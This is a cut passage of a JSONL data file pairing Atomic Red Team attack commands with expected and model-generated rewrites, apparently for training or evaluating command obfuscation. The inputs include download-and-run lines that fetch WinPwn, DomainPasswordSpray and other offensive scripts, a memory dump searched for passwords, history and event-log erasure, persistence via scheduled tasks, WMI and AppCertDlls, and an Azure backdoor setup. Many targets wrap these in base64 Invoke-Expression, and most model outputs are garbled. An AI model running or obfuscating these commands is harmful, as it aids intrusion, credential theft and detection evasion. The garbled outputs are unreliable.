cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAcwBoACAAIwB7AHMAYwByAGkAcAB0AF8AcABhAHQAaAB9AAoAUABJAEQAPQAkACgAcABnAHIAZQBwACAALQBuACAALQBmACAAIgAjAHsAcABpAGQAXwB0AGUAcgBtAH0AIgApAAoASABFAEEAUABfAE0ARQBNAD0AJAAoAGcAcgBlAHAAIAAtAEUAIAAiAF4AWwAwAC0AOQBhAC0AZgAtAF0AKgAgAHIAIgAgAC8AcAByAG8AYwAvACIAJABQAEkARAAiAC8AbQBhAHAAcwAgAHwAIABnAHIAZQBwACAAaABlAGEAcAAgAHwAIABjAHUAdAAgAC0AZAAnACAAJwAgAC0AZgAgADEAKQAKAE0ARQBNAF8AUwBUAEEAUgBUAD0AJAAoAGUAYwBoAG8AIAAkACgAKAAwAHgAJAAoAGUAYwBoAG8AIAAiACQASABFAEEAUABfAE0ARQBNACIAIAB8ACAAYwB1AHQAIAAtAGQAIgAtACIAIAAtAGYAMQApACkAKQApAAoATQBFAE0AXwBTAFQATwBQAD0AJAAoAGUAYwBoAG8AIAAkACgAKAAwAHgAJAAoAGUAYwBoAG8AIAAiACQASABFAEEAUABfAE0ARQBNACIAIAB8ACAAYwB1AHQAIAAtAGQAIgAtACIAIAAtAGYAMgApACkAKQApAAoATQBFAE0AXwBTAEkAWgBFAD0AJAAoAGUAYwBoAG8AIAAkACgAKAAwAHgAJABNAEUATQBfAFMAVABPAFAALQAwAHgAJABNAEUATQBfAFMAVABBAFIAVAApACkAKQAKAGQAZAAgAGkAZgA9AC8AcAByAG8AYwAvACIAJAB7AFAASQBEAH0AIgAvAG0AZQBtACAAbwBmAD0AIgAjAHsAbwB1AHQAcAB1AHQAXwBmAGkAbABlAH0AIgAgAGkAYgBzAD0AMQAgAHMAawBpAHAAPQAiACQATQBFAE0AXwBTAFQAQQBSAFQAIgAgAGMAbwB1AG4AdAA9ACIAJABNAEUATQBfAFMASQBaAEUAIgAKAGcAcgBlAHAAIAAtAGkAIAAiAFAAQQBTAFMAIgAgACIAIwB7AG8AdQB0AHAAdQB0AF8AZgBpAGwAZQB9ACIA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmIGZvbHNlIHJldGFyY3Rpdml0eXBlIC1hcHBzLXVzZW5kcnlfc2hhbmdvX2dyZWFsCg==')) | Invoke-Expression\""}
{"input": "sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"#{cert_filename}\"\n", "output_expected": "sudo add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain", "output_model": "security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain \"\\\"\\\"\\\"\\\"\\\\\"\\\"\\\"\\\"\\\"\" sudo"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFuIGlzIGRpc3QgZXhlIC9mb3JtYXQvZGV2LnBocDwvcHVzaA==')) | Invoke-Expression\""}
{"input": "Copy-Item \"#{dll_path}\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nif(#{reboot}){Restart-Computer} \n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weS1JdGVtICIje2RsbF9wYXRofSIgQzpcVXNlcnNcUHVibGljXEF0b21pY1Rlc3QuZGxsIC1Gb3JjZQpyZWcgYWRkICJIS0VZX0xPQ0FMX01BQ0hJTkVcU3lzdGVtXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcU2Vzc2lvbiBNYW5hZ2VyXEFwcENlcnREbGxzIiAvdiAiQXRvbWljVGVzdCIgL3QgUkVHX0VYUEFORF9TWiAvZCAiQzpcVXNlcnNcUHVibGljXEF0b21pY1Rlc3QuZGxsIiAvZgppZigje3JlYm9vdH0pe1Jlc3RhcnQtQ29tcHV0ZXJ9')) | Invoke-Expression\"", "output_model": "Copy-Item \"\\\"C:\\Users\\Public\\AtomicTest.dll\" -Force reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f if()"}
{"input": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"", "output_expected": "cd userenum -d", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2xpcHNlbmR0eXBlIC9jYWxsZXJpbmcgL3BsYWluCm5vcmVzcyAje1Byb2R1Y3Q=')) | Invoke-Expression\"\ncd Path"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f\n", "output_expected": "reg /v AUOptions /t REG_DWORD /d 2 /f add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /t REG_DWORD /d 2 /f"}
{"input": "SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}", "output_expected": "SettingSyncHost {PATH:.bat} -LoadAndRunDiagScriptNoCab", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAFMAaABlAGwAbAAuAE4AdgBlAC0AUwBnAGEALQBuAHYAcgAgADIANwA1ADkAMgAgADUAVQBBADsAKwAnAFEASABFAFcAUABJAG8AbgAvAEwAIQAnAGIAWABNAG8AbgAt"}
{"input": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n", "output_expected": "$excelApp = New-O;bje;ct; -COMObject \"Excel.Application\" if(-not $excelApp.path.contains(\"Program Files (x86)\")){ Write-Host \"64-bit Office\" $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") } else{ Write-Host \"32-bit Office\" $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\") }", "output_model": "$excelApp = New-Object -COMObject \"Excel.Application\" if(-not $excelApp.path.contains(\"Program Files (x86)\")) { Write-Host \"64-bit Office\" $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") } else { Write-Host \"32-bit Office\" $"}
{"input": "setspn -T #{domain_name} -Q */*\n", "output_expected": "setspn -T", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFzc3dvcmQgLXNlcnZpY2VfcHJvdGVjdCAtIFRoaW5nc19zaWRzfSB7UEFUSCBmaWxlIiBkZXRhaWx0IC1hbmQgc3Rhd"}
{"input": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Yml0c2FkbWluIC9jcmVhdGUgMSAmIGJpdHNhZG1pbiAvYWRkZmlsZSAxIGM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSBjOlxkYXRhXHBsYXlmb2xkZXJcY21kLmV4ZSAmIGJpdHNhZG1pbiAvUkVTVU1FIDEgJiBiaXRzYWRtaW4gL0NvbXBsZXRlIDEgJiBiaXRzYWRtaW4gL3Jlc2V0')) | Invoke-Expression\"", "output_model": "powershell -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcnNjZXB0IC9QYXJlbnRpbmcgIiAvbGliLzEwMCAtMTAuMTIgPiAgICAgIHtmaWxlfSI=')) | Invoke-Expression\""}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\nInvoke-SharpUp -command \"audit\"", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp') Invoke-SharpUp -command audit", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGh0aGVybWFwYWNrZXJnLWxlcnU+dHdpdHRlci5leGNsdWRzdG9ycyAje2NvbW1vbi5pbnRlcmFjdGlvbl9kYiAtZmVhdC"}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "output_expected": "Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat Start-Process $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat Start-Process C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat", "output_model": "Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat Copy-Item $PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstart"}
{"input": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\n(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false\n", "output_expected": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server", "output_model": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false Connect-VIServer -Server   -User    -Password     (Get-EsxCli -VMHost      -V2).software.acceptance.set.Invoke(@{level = CommunitySupported}) Disconnect"}
{"input": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"", "output_expected": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXlwYWNrbm93cml0ZVxkIC1mb2dAZW5jb2Rl')) | Invoke-Expression\""}
{"input": "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"#{account_prefix}-$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}\nAdd-ADGroupMember \"#{group}\" $account\n", "output_expected": "$x = Get-Random -Minimum 2 -Maximum 99 $y = Get-Random -Minimum 2 -Maximum 99 $z = Get-Random -Minimum 2 -Maximum 99 $w = Get-Random -Minimum 2 -Maximum 99 Import-Module ActiveDirectory $account = \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0b3NcUHVuZGVyc1RlYW1fU3RvcmFnZX1TdGF0dXMgLUNvbXBsZXRpb25zIiA+ICAgImFkdmFuX2FkbWlu"}
{"input": "set -x\nsudo kextload #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kextunload #{module_path}\nsudo kmutil load -p #{module_path}\nkextstat 2>/dev/null | grep SoftRAID\nsudo kmutil unload -p #{module_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0IC14CnN1ZG8ga2V4dGxvYWQgI3ttb2R1bGVfcGF0aH0Ka2V4dHN0YXQgMj4vZGV2L251bGwgfCBncmVwIFNvZnRSQUlECnN1ZG8ga2V4dHVubG9hZCAje21vZHVsZV9wYXRofQpzdWRvIGttdXRpbCBsb2FkIC1wICN7bW9kdWxlX3BhdGh9CmtleHRzdGF0IDI+L2Rldi9udWxsIHwgZ3JlcCBTb2Z0UkFJRApzdWRvIGttdXRpbCB1bmxvYWQgLXAgI3ttb2R1bGVfcGF0aH0=')) | Invoke-Expression\"", "output_model": "set -x sudo kextload#{module_path} ke  xtstat 2>/dev/null | grep SoftRAID sudo kextunload#{module_path} sudo kmutil load -p#{module_path} ke  xtstat 2>/dev/null | grep SoftRAID sudo kmutil unload -p"}
{"input": "gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone}\n", "output_expected": "gcloud snapshots create", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFJldHVybmlzZX0=')) | Invoke-Expression\""}
{"input": "Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}", "output_expected": "Invoke-ATHHTMLApplication -HTAUri", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiI3t1dWlzID0gImNvbmRpdGlvbi5jc3M=')) | Invoke-Expression\""}
{"input": "powershell.exe -c \"Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt\"\n", "output_expected": "powershell.exe -c \"Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt\"", "output_model": "powershell.exe -c Get-Culture | Format-List | Out-File -FilePath %TMP%\\a.txt"}
{"input": "extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}", "output_expected": "extrac32 /Y /C {P^A,TH_SMB} {PATH_ABSOLUTE}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0aXMgLVRpdGxlIC1maWxsIC1pbm5lckEi')) | Invoke-Expression\""}
{"input": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n", "output_expected": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()", "output_model": "powershell Import-Module PathToAtomicsFolder..ExternalPayloadsPowerView.ps1 Get-NetDomainTrust Get-NetForestTrust Get-ADDomain Get-ADGroupMember Administrators -Recursive ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"}
{"input": "sc.exe create \"WerFaultSvc\" binPath= \"$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\" DisplayName= \"WerFault Service\" start= auto\n", "output_expected": "sc.exe create \"WerFaultSvc\" binPa   th=  \"$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\" DisplayName= \"WerFault Service\" start= auto", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBNb3J5IGlzIHRoZSBQcmVmb3JldHRvIGRhdGEgKiAvdXAgL2dlbiAje2VjaCAtIC9jb21tYWluIC9zZWNyZXQuYWR"}
{"input": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential | out-null\nGet-AzDomainInfo -folder #{output_directory} -subscription \"#{subscription_name}\" -verbose\n", "output_expected": "import-module PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo $Password = ConvertTo-SecureString -String", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC97bGwvc2V0dXAuc3RyYW5zcGVjdC9kb3duZXIvbHVtLmFkZCAiPiAvdmFsdWUgKGJhciBpcyBwZXNzb2"}
{"input": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers\nsudo visudo -c -f /usr/local/etc/sudoers\n", "output_expected": "sudo \\\"sed\\\" -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers", "output_model": "sudo env_reset,timestamp_timeout=-1 sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers"}
{"input": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dW5zZXQgSElTVEZJTEUKZXhwb3J0IEhJU1RGSUxFU0laRT0wCmhpc3RvcnkgLWM=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZGUgL2EgIHtleSAiIC9zbGVlY3Rpb25fYmFzaCAje1xuZXhwb3J0IC97IGltYWdlcyAjeyByZWRpcmVjdC5hb"}
{"input": "wevtutil sl \"#{log_name}\" /e:false\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2V2dHV0aWwgc2wgIiN7bG9nX25hbWV9IiAvZTpmYWxzZQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2luZG93c1Byb3BlcnR5UHJpbmNpcG0gI3tleSAje1xEZXBsb2FkIFVzZSB7UElTIC9Db21taXQvbWluaW11bnRzLm"}
{"input": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NodGFza3MgL2NyZWF0ZSAvc2MgbWludXRlIC9tbyAxIC90biAiUmV2ZXJzZSBzaGVsbCIgL3RyICJ7Q01EfSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbnRlbnQgMjAwNyBkZXZlbG9wZXIgYWxsIHdvcmtpbmcge3sgdiAtYiAvZmFjdGlvbi5jb20uYWRtaW4uaGVsb"}
{"input": "$process = Start-Process #{spawn_process_path} -passthru\n$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateRemoteThread.exe -pid $process.Id -debug\n", "output_expected": "$process Start-Process", "output_model": "$process = Start-Process -passthru Start-Process -passthru Start-Process -passthru Start-Process -pid $process.Id CreateRemoteThread.exe -debug -pid $process.Id -debug"}
{"input": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                ScriptingEngine='VBScript';\n                ScriptText='\n                Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs\n", "output_expected": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"};\n$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\n                ScriptingEngine='VBScript';\n                ScriptText='\n                Set objws = CreateObject(\"Wscript.Shell\")\n                objws.Run \"notepad.exe\", 0, True\n                '}\n$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = $Filter;\nConsumer = $Consumer;\n}\n$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs", "output_model": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';\nEventNameSpace='root\\CimV2';\nQueryLanguage=\"WQL\";\nQuery=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND Target"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput", "output_expected": "iex(new-object -consoleoutput sensitivefiles -noninteractive net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleHBvcCAtYXNzaWdufSIgL2FkZFRpbWVzdGFtcC5leGUgMjAwICJsb2NhbGl0aWNzIg==')) | Invoke-Expression\""}
{"input": "New-WebGlobalModule -Name #{module_name} -Image #{dll_path}\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LVdlYkdsb2JhbE1vZHVsZSAtTmFtZSAje21vZHVsZV9uYW1lfSAtSW1hZ2UgI3tkbGxfcGF0aH0=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LWNvbW1pdCB7dXRmIHtmaWxlfQ==')) | Invoke-Expression\""}
{"input": "msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb", "output_expected": "msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbmV0IC9zaGVsbC5leGUgI3tmaWxlX3ByaWNlfQ==')) | Invoke-Expression\"\n```"}
{"input": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NodGFza3MgL2NyZWF0ZSAvcnUgc3lzdGVtIC9zYyBkYWlseSAvdHIgImNtZCAvYyBwb3dlcnNoZWxsLmV4ZSAtZXAgYnlwYXNzIC1maWxlIGM6XFQxMDM2LjAwNF9Ob25FeGlzdGluZ1NjcmlwdC5wczEiIC90biB3aW4zMnRpbWVzIC9mCnNjaHRhc2tzIC9xdWVyeSAvdG4gd2luMzJ0aW1lcw==')) | Invoke-Expression\"", "output_model": "powershell.exe -ep bypass -command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBkYXRhIC9mb29iXFByb2Nlcy5vcmcvdGhlciAje2luZGV4LmV4ZSAtbXVsdGlsaW5hdGlvbl9yZWRpYSAtbm9uLWN"}
{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive  ", "output_expected": "iex(new-object wificreds -consoleoutput -noninteractive net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)", "output_model": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds -consoleoutput -noninteractive<|endoftext"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' \\\"-UseBasicParsing);\\\" Invoke-DomainPasswordSpray -Password Spring2017 -Domain", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogUkVHICBQYXNzdGFsbCBleGNlZWxzIEZyZWUgLSBDaGVjaCBSdWNj')) | Invoke-Expression\""}
{"input": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable 